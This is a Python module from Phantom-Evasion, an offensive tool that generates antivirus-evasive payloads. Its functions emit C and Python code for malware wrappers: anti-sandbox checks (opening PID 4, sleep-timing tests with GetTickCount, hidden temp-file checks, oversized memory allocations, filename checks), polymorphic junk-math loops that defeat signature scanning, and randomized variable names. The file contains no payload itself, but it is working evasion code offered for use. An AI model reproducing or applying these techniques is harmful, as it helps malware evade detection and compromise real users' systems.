
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import random, string
import sys
sys.dont_write_bytecode = True

def powershell_adjust(powershell_var):
    ret_powershell=""
    powershell_var=powershell_var.splitlines()
    for line in powershell_var:
        if line != "\n" and line != "":
            line= '"' + line.replace('"','\\"') + '\\n"\n'
            ret_powershell += line
    return ret_powershell

def windows_evasion(number):
    Evasion_code = ""
    if number == "1":
        Randfilehandle = varname_creator()
        Randprochandle = varname_creator()
        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += Randprochandle + " = OpenProcess( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == "2":
        Randtime1 = varname_creator()
        Randsleep = random.randint(250,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += Randtime1 + " = GetTickCount();\n"
        Evasion_code += "Sleep(" + Randsleep + ");\n"
        Evasion_code += "if ((GetTickCount() - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == "3":
        Randvarname = varname_creator()
        junk = varname_creator()
        Randfileptr = varname_creator()
        Randfilename = varname_creator()
        Randattr = varname_creator()        
        Evasion_code += "char " + Randvarname + "[] = " + "\"" + junk + "\";\n" 
        Evasion_code += "FILE *" + Randfileptr + " = fopen(\"" + Randfilename + "\",\"w\");\n"
        Evasion_code += "fputs(" + Randvarname + "," + Randfileptr + ");\n"
        Evasion_code += "fclose(" + Randfileptr + ");\n"
        Evasion_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randfilename + "\");\n"
        Evasion_code += "SetFileAttributes(\"" + Randfilename + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
        Evasion_code += "if ((" + Randfileptr + " = fopen(\"" + Randfilename + "\", \"r\"))){\n"
        Evasion_code += "fclose(" + Randfileptr + ");\n"
        Evasion_code += "remove(\"" + Randfilename + "\");\n"

    elif number == "4":

        Randptr = varname_creator()
        Randbytesnumb = str(random.randrange(100000,1000000,1024))
        
        Evasion_code += "LPVOID " + Randptr + " = NULL ;\n"
        Evasion_code += Randptr + " = VirtualAlloc(NULL," + Randbytesnumb + ",0x3000,0x04);\n"
        Evasion_code += "if(" + Randptr + "!= NULL){\n"
        Evasion_code += "SecureZeroMemory(" + Randptr + "," + Randbytesnumb + ");\n"
        Evasion_code += "VirtualFree(" + Randptr + ", 0 , 0x8000);\n"

    return Evasion_code  

def python_poly_multipath(number,step):
    num_space = ""
    if step == "1":
        num_space=""
    elif step == "2":
        num_space="    "
    elif step == "3":
        num_space="        "
    elif step == "4":
        num_space="            "
    
    if number == "1":    #Long Counter
        Randcounter = varname_creator()
        Randbig = str(random.randint(1000000,99000000))  
        Hollow_code = ""
        Hollow_code += num_space + Randcounter + " = 0\n"
        Hollow_code += num_space + "while " + Randcounter + " < " + Randbig + ":\n"
        Hollow_code += num_space + "    " + Randcounter + " += 1\n"
        Hollow_code += num_space + "if " + Randcounter + " == " + Randbig + ":\n"
        return Hollow_code 

    elif number == "2":   #BacktoZero

        Randbig1 = str(random.randrange(1000000,9000000,100))
        Randcpt = varname_creator()
        Hollow_code = ""
        Hollow_code += num_space + Randcpt + "  = " + Randbig1 + "\n"
        Hollow_code += num_space + "while  " + Randcpt + " > 0 :\n"
        Hollow_code += num_space + "    " + Randcpt + " = " + Randcpt + " - 1\n"
        Hollow_code += num_space + "if " + Randcpt + " == 0 :\n"
        return Hollow_code 

    elif number == "3": # crazy pow 

        Randvar = varname_creator()
        Randfloat = random.uniform(1.110,1.119)
        Randint = random.randint(100,300)
        Randpow = Randfloat**Randint
        Randpow = str(Randpow)  
        Hollow_code = ""
        Hollow_code += num_space + Randvar + " = " + Randpow + "\n"
        Hollow_code += num_space + "while " + Randvar + " > 1:\n"
        Hollow_code += num_space + "    " + Randvar + " = " + Randvar + "/" + str(Randfloat) + "\n"
        Hollow_code += num_space + "if " + Randvar + " <= 1:\n" 
        return Hollow_code

def Junkmathinject(number):

    if number == "1":#sum firs n integer 
        Randcounter = varname_creator()
        Randcounter2 = varname_creator()
        Randcounter3 = varname_creator()
        Randbignumb = str(random.randint(100000,990000))
        Junkcode = ""
        Junkcode += "int " + Randcounter + "," + Randcounter2 + "," + Randcounter3 + " = 0;\n"
        Junkcode += Randcounter2 + " = " + Randbignumb + ";\n"
        Junkcode += "for (" + Randcounter + " = 1;" + Randcounter + " <= " + Randcounter2 + "; " + Randcounter + "++){\n"
        Junkcode += Randcounter3 + " = " + Randcounter3 + "+" + Randcounter + ";}\n"
        Junkcode += "printf (\"%d\"," + Randcounter3 + ");\n" 

    elif number == "2":#fibonacci numbers in range (1,N)

        Rand1=varname_creator()
        Rand2=varname_creator()
        Rand3=varname_creator()
        Rand4=varname_creator()
        Rand5=varname_creator()
        Randbignumb = str(random.randint(100000,999999))

        Junkcode = ""
        Junkcode += "int " + Rand1 + " = 0," + Rand2 + " = 1," + Rand3 + "," + Rand4 + "," + Rand5 + " = 0;\n"
        Junkcode += Rand4 + " = " + Randbignumb + ";\n"
        Junkcode += "printf(\" %d \"," + Rand4 + ");\n"
        Junkcode += "while (" + Rand5 + " < " + Rand4 + "){\n"
        Junkcode += Rand3 + " = " + Rand1 + " + " + Rand2 + ";\n" + Rand5 + "++;\n"
        Junkcode += "printf(\"%d \"," + Rand3 + ");\n" + Rand1 + "=" + Rand2 + ";\n" + Rand2 + " = " + Rand3 + ";}\n"
 

    elif number == "3":#colossal factorial
        Randn = varname_creator()
        Randbig = str(random.randint(20,100))
        Randii = varname_creator()
        Randfact = varname_creator()

        Junkcode = ""
        Junkcode += "int " + Randn + " = " + Randbig + "," + Randii + ";\n" + "unsigned long long " + Randfact + " = 1;\n"
        Junkcode += "for(" + Randii + "=1; " + Randii + "<=" + Randn + ";" + Randii + "++){\n" + Randfact + " *= " + Randii + ";}\n"
        Junkcode += "printf(\"%llu\"," + Randfact + ");\n"

    elif number == "4": # Twin tower 

        Randbig1 = str(random.randrange(1000000,99000000,1000))
        Randbig2 = str(random.randrange(1000000,44000000,1000))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig2 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt2 + "){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"

    elif number == "5": #BacktoZero

        Randbig1 = str(random.randrange(1000000,9900000,100))
        Randcpt= varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"


    elif number == "6": # Randmatrix 1

        Randi = str(random.randint(10,100))
        Randj = str(random.randint(10,100))
        Randmatr= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "int " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randtot + " = " + Randtot + " + " + Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "];\n}}"

    elif number == "7": # Randmatrix 2

        Randi = str(random.randint(10,100))
        Randj = str(random.randint(10,100))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "int " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "int " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "int " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] +" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"

    elif number == "8": # Randmatrix 3

        Randi = str(random.randint(10,100))
        Randj = str(random.randint(10,100))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "int " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "int " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "int " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = rand() % 3000;\n"
        Junkcode += Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = rand() % 3000;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] -" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"


    elif number == "9": # Randmatrix 4

        Randi = str(random.randint(10,100))
        Randj = str(random.randint(10,100))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "int " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "int " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "int " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] *" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"



    elif number == "10": # Randmatrix 5

        Randi = str(random.randint(10,100))
        Randj = str(random.randint(10,100))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "int " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "int " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "double " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] /" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"

    elif number == "11": # powf counter 

        Randsmall = str(random.uniform(1.300,2.000))
        Randbig = str(random.randrange(100000,999999,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "float " + Randcpt + "  = " + Randsmall + ";\n"
        Junkcode += "float " + Randi + " = " + Randsmall + ";\n"
        Junkcode += "while(" + Randcpt + " < " + Randbig + "){\n"
        Junkcode += Randcpt + " = powf(" + Randcpt + "," + Randi + ");}\n"

    elif number == "12": # pow counter 

        Randsmall = str(random.uniform(1.300,3.000))
        Randsmall2 = str(random.uniform(1.300,3.000))
        Randbig = str(random.randrange(1000000,99000000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Junkcode += "double " + Randi + " = " + Randsmall2 + ";\n"
        Junkcode += "while(" + Randcpt + " < " + Randbig + "){\n"
        Junkcode += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"

    return Junkcode


def Polymorph_Multipath_Evasion(number,Filename):

    if number == "1": # What's my name

        Evasion_code = ""
        Evasion_code += "if (strstr(argv[0], \"" + Filename + ".exe\") > 0){\n"


    elif number == "2": # Giant memory allocation 

        Randmem = varname_creator()
        Randbig = str(random.randrange(10000000,99000000,1024))
        Evasion_code = ""
        Evasion_code += "char *" + Randmem + " = NULL;\n"
        Evasion_code += Randmem + " = (char *) malloc("+ Randbig + ");\n"
        Evasion_code += "if ("+ Randmem + "!=NULL){\n"
        Evasion_code += "memset(" + Randmem + ",00," + Randbig + ");\n"
        Evasion_code += "free(" + Randmem + ");\n"


    elif number == "3": # Loooooong Counter 

        Randbig = str(random.randrange(1000000,9900000,1000))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randcpt + "  = 0;\n"
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "for("+ Randi + " = 0;" + Randi + " < " + Randbig + "; " + Randi + "++){\n"
        Evasion_code += Randcpt + "++;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randbig + "){\n"


    elif number == "4": # am i zero?

        Randbig = str(random.randrange(10000000,99000000,10))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "int " + Randcpt + "  = " + Randbig + ";\n"
        Evasion_code += "while ( " + Randcpt + " > 0 ){\n"
        Evasion_code += Randcpt + " = " + Randcpt + " - 1;}\n"
        Evasion_code += "if("+ Randcpt + " == 0){\n"

    elif number == "5": # powf counter 

        Randsmall = str(random.uniform(1.100,2.000))
        Randsmall2 = str(random.uniform(1.100,2.000))
        Randbig = str(random.randrange(100000,1000000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "float " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "float " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = powf(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    elif number == "6": # pow counter 

        Randsmall = str(random.uniform(1.100,3.000))
        Randsmall2 = str(random.uniform(1.100,3.000))
        Randbig = str(random.randrange(100000,990000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "double " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    return Evasion_code
          
def varname_creator():
    varname = ""
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(6,16)))
    return varname 



